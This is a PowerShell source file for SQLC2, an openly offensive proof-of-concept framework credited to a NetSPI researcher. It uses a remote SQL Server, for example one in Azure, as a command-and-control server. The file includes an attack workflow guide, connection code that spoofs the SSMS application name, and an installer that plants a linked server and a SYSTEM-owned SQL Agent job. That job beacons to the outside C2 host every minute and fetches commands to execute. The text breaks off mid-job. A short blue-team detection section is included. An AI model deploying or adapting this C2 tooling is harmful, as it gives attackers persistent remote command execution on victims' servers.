<#
	Script:  SQLC2.ps1
	Description: This is a basic PoC script that contains functions that can be 
		     used to install and manage a C2 via a SQL Server instance.
		     The C2 SQL Server is intended to be hosted remotely or in Azure 
		     via a database.windows.net address.  The client functions can be
		     run by a schedule task or other means for periodic check in
		     and command grabbing from the C2 SQL Server.
	Author:  Scott Sutherland (@_nullbind), NetSPI 2018
	License: BSD 3-Clause
	Mini Guide:

	    ----------------------------
	    Azure Configuration Overview
	    ----------------------------

	    1. Create an Azure account and log in.

	    3. Create a SQL server databse. In this example the server will be named sqlcloudc2 and the datatabase will be named database1.

	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from.

	    ----------------------------
	    Attack Workflow Overview
	    ----------------------------
	    1. Install SQLC2.

	    Install C2 tables in remote SQL Server instance. You will need to provide an database that you have the ability to create tables in, or create a new at database.  However, in Azure I've been getting some timeouts which is why you should have already created the target database through Azure.  

	    Example command:
	    Install-SQLC2Server -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 

	    2. Setup OS command.

	    Set a OS command to run on all agent systems.  You can also configure commands to run on a specific agent using the -ServerName paremeter.

	    Example command:
	    Set-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Command "Whoami"

	    3. List queued commands.

	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. This will only output the commands, it will not execute them.

	    Example command:
	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 

	    4. The agent will automatically be registered.  To list the registered agent use the command below.

	     Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 

	    5. Execute queued commands via PS. This can be scheduled via a WMI subscription or schedule task.

	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. Including the -Execute flag will automatically run them.  This command could be used in combination with your prefered persistence method such as a scheduled task.

	    Example command:
	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Execute
		
	    5. Execute queued commands via SQL Server link and agent job. This allows you to use an internal SQL Server as your agent.	This requires sysadmin privileges on the internal SQL Server.	
	    
	    Install-SQLC2AgentLink -Instance 'InternalSQLServer1\SQLSERVER2014' -C2Username 'CloudAdmin' -C2Password 'CloudPassword!' -C2Instance sqlcloudc2.database.windows.net -C2Database database1 -Verbose 	
	    
	    Note:  You can use the command below to remove the server link agent.
	    
	    Uninstall-SQLC2AgentLink  -Verbose -Instance 'InternalSQLServer1\SQLSERVER2014'

	    6. View command results.

	    The command below can be used to retrieve the command results. By default it shows the entire command history. However, results can be filtered by -Status, -ServerName, and -Cid.

	    Example command:
	    Get-SQLC2Result -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Status 'success'

	    ----------------------------
	    Blue Team Datasource Notes
	    ----------------------------
	    1. PowerShell logging.
	    2. EDR showing PowerShell connecting to the internet. Specifically, *.database.windows.net (Azure)
	    3. EDR showing specific commands being executed such as "Get-SQLC2Comand".
#>


# ----------------------------------
#  Get-C2SQLConnectionObject
# ----------------------------------
# Author: Scott Sutherland
Function Get-C2SQLConnectionObject
{
    <#
            .SYNOPSIS
            Creates a object for connecting to SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-C2SQLConnectionObject -Username myuser -Password mypass -Instance server1 -Encrypt Yes -TrustServerCert Yes -AppName "myapp"
            StatisticsEnabled                : False
            AccessToken                      : 
            ConnectionString                 : Server=server1;Database=Master;User ID=myuser;Password=mypass;Connection Timeout=1 ;Application 
                                               Name="myapp";Encrypt=Yes;TrustServerCertificate=Yes
            ConnectionTimeout                : 1
            Database                         : Master
            DataSource                       : server1
            PacketSize                       : 8000
            ClientConnectionId               : 00000000-0000-0000-0000-000000000000
            ServerVersion                    : 
            State                            : Closed
            WorkstationId                    : Workstation1
            Credential                       : 
            FireInfoMessageEventOnUserErrors : False
            Site                             : 
            Container                        : 
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )

    Begin
    {
        # Setup DAC string
        if($DAC)
        {
            $DacConn = 'ADMIN:'
        }
        else
        {
            $DacConn = ''
        }

        # Set database filter
        if(-not $Database)
        {
            $Database = 'Master'
        }

        # Check if appname was provided
        if($AppName){
            $AppNameString = ";Application Name=`"$AppName`""
        }else{
            $AppNameString = ""
        }

        # Check if encrypt was provided
        if($Encrypt){
            $EncryptString = ";Encrypt=Yes"
        }else{
            $EncryptString = ""
        }

        # Check TrustServerCert was provided
        if($TrustServerCert){
            $TrustCertString = ";TrustServerCertificate=Yes"
        }else{
            $TrustCertString = ""
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection

        # Set authentcation type - current windows user
        if(-not $Username){

            # Set authentication type
            $AuthenticationType = "Current Windows Credentials"

            # Set connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1 $AppNameString $EncryptString $TrustCertString"
        }
        
        # Set authentcation type - provided windows user
        if ($username -like "*\*"){
            $AuthenticationType = "Provided Windows Credentials"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString"
        }

        # Set authentcation type - provided sql login
        if (($username) -and ($username -notlike "*\*")){

            # Set authentication type
            $AuthenticationType = "Provided SQL Login"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut $AppNameString$EncryptString$TrustCertString"
        }

        # Return the connection object
        return $Connection
    }

    End
    {
    }
}


# ----------------------------------
#  Get-C2SQLQuery
# ----------------------------------
# Author: Scott Sutherland
Function Get-C2SQLQuery
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-C2SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-C2SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-C2SQLQuery -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "Microsoft SQL Server Management Studio - Query",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "Yes",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "Yes",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )

    Begin
    {
        # Setup up data tables for output
        $TblQueryResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        else
        {
            # Create connection object
            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }

        # Parse SQL Server instance name
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(';')[0].split('=')[1]

        # Check for query
        if($Query)
        {
            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblQueryResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed - for detail error use  Get-SC2QLConnectionTest
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }

                if($ReturnError)
                {
                    $ErrorMessage = $_.Exception.Message
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }
        else
        {
            Write-Output -InputObject 'No query provided to Get-C2SQLQuery function.'
            Break
        }
    }

    End
    {
        # Return Results
        if($ReturnError)
        {
            $ErrorMessage
        }
        else
        {
            $TblQueryResults
        }
    }
}


# ----------------------------------
#  Get-SC2QLConnectionTest
# ----------------------------------
Function Get-SC2QLConnectionTest
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .EXAMPLE
            PS C:\> Get-SC2QLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
            .EXAMPLE
            PS C:\> Get-SC2QLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SC2QLConnectionTest -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()
        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Return Results
        $TblResults
    }
}


# -------------------------------------------
# Function: Get-C2ComputerNameFromInstance
# ------------------------------------------
# Author: Scott Sutherland
Function Get-C2ComputerNameFromInstance
{
    <#
            .SYNOPSIS
            Parses computer name from a provided instance.
            .PARAMETER Instance
            SQL Server instance to parse.
            .EXAMPLE
            PS C:\> Get-C2ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
            SQLServer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Parse ComputerName from provided instance
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }

    Return $ComputerName
}


# ----------------------------------
#  Install-SQLC2Server
# ----------------------------------
# Author: Scott Sutherland
Function Install-SQLC2Server
{
    <#
            .SYNOPSIS
            This functions creates the C2 SQL Server tables in the target database.  
            If the database does not exist, the script will try to create it.            
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .EXAMPLE
            PS C:\> Install-SQLC2Server -Instance "SQLServer1\STANDARDDEV2014" -Database database1 
            PS C:\> Install-SQLC2Server -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1 
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'ServerName of the agent.')]
        [string]$ServerName,

       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Command to run on the agent.')]
        [string]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        # Test connection
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        Write-Verbose "$instance : Creating databases in Azure may timeout, but can be created manually via SSMS."
        Write-Verbose "$instance : Attempting to verify and/or create the database $Database..."

        # Create Database Query 
        $Query = "    
            If not Exists (SELECT name FROM master.dbo.sysdatabases WHERE name = '$Database')
	            CREATE DATABASE db1
            ELSE
	            SELECT name FROM master..sysdatabases WHERE name like '$Database'"
        
        # Create Database results
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'master' -SuppressVerbose -TimeOut 300 
        $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count        
        if($RowCount -eq 1)
        {
           Write-Verbose "$instance : Verified $Database database exists or was created."
        }else{
           Write-Verbose "$instance : Access or creation of $Database database failed."
           return  
        }

        Write-Verbose "$instance : Creating the C2 Table in the database $Database on $Instance."

        # Create Database Query 
        $Query = "    
                If not Exists (SELECT name FROM sys.tables WHERE name = 'C2COMMANDS')
                CREATE TABLE [C2COMMANDS] 
                (
	                [cid] int IDENTITY(1,1) PRIMARY KEY,
	                [servername]varchar(MAX),
	                [command]varchar(MAX),
	                [result]varchar(MAX),
	                [status]varchar(MAX),
                    [lastupdate]DateTime default (Getdate())
                );

                If not Exists (SELECT name FROM sys.tables WHERE name = 'C2AGENTS')
                CREATE TABLE [C2AGENTS] 
                (
	                [aid] int IDENTITY(1,1) PRIMARY KEY,
	                [servername]varchar(MAX),
	                [agentype]varchar(MAX),
	                [lastcheckin]DateTime default (Getdate()),
                );SELECT name FROM sys.tables WHERE name = 'C2COMMANDS'"
        
        # Create Database results
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database "$Database" -SuppressVerbose
        $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count    
        if($RowCount -eq 1)
        {
           Write-Verbose "$instance : Verified C2 tables existed or were created in the $Database on $Instance."
        }else{
           Write-Verbose "$instance : C2 tables creation failed in the $Database on $Instance failed."  
        }
        
    }

    End
    {
        # Return data
        # $TblResults
    }
}


# ----------------------------------
#  Install-SQLC2AgentLink - In Progress
# ----------------------------------
# Author: Scott Sutherland
Function Install-SQLC2AgentLink
{
    <#
            .SYNOPSIS
            This functions installs a C2 Agent on the target SQL Server by creating a server link
            to the C2 SQL Server, then it creates a TSQL SQL Agent job that uses the link to download
            commands from the C2 server and executes them. By default is execute OS command using xp_cmdshell.
            This requires sysadmin privileges on the target server.           
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER C2Username
            SQL Server or domain account to authenticate with.
            .PARAMETER C2Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER C2Instance
            SQL Server C2 instance to connection to.
            .PARAMETER C2DatabaseName
            Database name that contains target table on C2.
            .EXAMPLE
            Connecting using current Windows credentials.
            PS C:\> Install-SQLC2AgentLink -Instance "SQLServer1\STANDARDDEV2014" -C2Instance cloudserver1.database.windows.net -C2Username user -C2Password password -C2Database database1 
            .EXAMPLE
            Connecting using sa SQL server login.
            PS C:\> Install-SQLC2AgentLink -Instance "SQLServer1\STANDARDDEV2014" -Username sa -Pasword password! -C2Instance cloudserver1.database.windows.net -C2Username user -C2Password password -C2Database database1 
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'C2 SQL Server instance to connection to.')]
        [string]$C2Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server login or domain account to the authenticate to the C2 SQL Server with.')]
        [string]$C2Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server login domain account password to authenticate to the C2 SQL Server with.')]
        [string]$C2Password,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table on C2 SQL Server.')]
        [string]$C2Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        # Test connection
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # ----------------------------
        # Create SQL Server link
        # ----------------------------        

        # Generate random name for server link - needs to be random
        $RandomLink = "SQLC2Server"        

         # Create SQL Server link query 
        $Query = "    
                    -- Create Server Link C2 Server 
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 0
                    EXEC master.dbo.sp_addlinkedserver @server = N'$RandomLink', 
                    @srvproduct=N'', 
                    @provider=N'SQLNCLI', 
                    @datasrc=N'$C2Instance', 
                    @catalog=N'$C2Database'                    

                    -- Associate credentials with the server link
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
                    EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname=N'$RandomLink',
                    @useself=N'False',
                    @locallogin=NULL,
                    @rmtuser=N'$C2Username',
                    @rmtpassword='$C2Password'        

                    -- Configure the server link
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
                    EXEC master.dbo.sp_serveroption @server=N'$RandomLink', @optname=N'data access', @optvalue=N'true'                    

                    --IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
                    EXEC master.dbo.sp_serveroption @server=N'$RandomLink', @optname=N'rpc', @optvalue=N'true'

                    --IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
                    EXEC master.dbo.sp_serveroption @server=N'$RandomLink', @optname=N'rpc out', @optvalue=N'true'
                    
                    -- Verify addition of link
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1 
                        SELECT 1
                    ELSE
                        SELECT 0  
           "
        
        # Run Query
        Write-Verbose "$instance : Creating server link named '$RandomLink' as $C2Username to $C2Instance "
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -TimeOut 300 

        # Verify link addition
        if(($TblResults | Select Column1 -ExpandProperty Column1) -eq 1)
        {
            Write-Verbose "$instance : Confirmed server link named $RandomLink was added."
        }else{
            Write-Verbose "$instance : The server link could not be created."
            return
        }
        
        # -------------------------------
        # Create SQL Server Agent Job
        # -------------------------------

        # Generate random name for the SQL Agent Job
        Write-Verbose "$instance : Creating SQL Agent Job on $Instance."  
        Write-Verbose "$instance : The agent will beacon to $C2Instance every minute."  

        # Create SQL Server agent job
        $Query = " 

            /****** Object:  Job [SQLC2 Agent Job]    Script Date: 5/21/2018 12:23:40 PM ******/
            BEGIN TRANSACTION
            DECLARE @ReturnCode INT
            SELECT @ReturnCode = 0
            /****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 5/21/2018 12:23:40 PM ******/
            IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
            BEGIN
            EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

            END

            DECLARE @jobId BINARY(16)
            EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'SQLC2 Agent Job', 
		            @enabled=1, 
		            @notify_level_eventlog=0, 
		            @notify_level_email=0, 
		            @notify_level_netsend=0, 
		            @notify_level_page=0, 
		            @delete_level=0, 
		            @description=N'No description available.', 
		            @category_name=N'[Uncategorized (Local)]', 
		            @owner_login_name=N'NT AUTHORITY\SYSTEM', @job_id = @jobId OUTPUT
            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
            /****** Object:  Step [Run command]    Script Date: 5/21/2018 12:23:40 PM ******/
            EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Run command', 
		            @step_id=1, 
		            @cmdexec_success_code=0, 
		            @on_success_action=1, 
		            @on_success_step_id=0, 
		            @on_fail_action=2, 
		            @on_fail_step_id=0, 
		            @retry_attempts=0, 
		            @retry_interval=0, 
		            @os_run_priority=0, @subsystem=N'TSQL', 
		            @command=N'

                    -- Query server link - Register the agent
                    IF not Exists (SELECT * FROM [$RandomLink].database1.dbo.C2Agents  WHERE servername = (select @@SERVERNAME))
	                    INSERT [$RandomLink].database1.dbo.C2Agents (servername,agentype) VALUES ((select @@SERVERNAME),''ServerLink'')
                     ELSE
	                    UPDATE [$RandomLink].database1.dbo.C2Agents SET lastcheckin = (select GETDATE ())
                        WHERE servername like (select @@SERVERNAME)

                    -- Get the pending commands for this server from the C2 SQL Server
                    DECLARE @output TABLE (cid int,servername varchar(8000),command varchar(8000))
                    INSERT @output (cid,servername,command) SELECT cid,servername,command FROM [$RandomLink].database1.dbo.C2Commands WHERE status like ''pending'' and servername like @@servername

                    -- Run all the command for this server
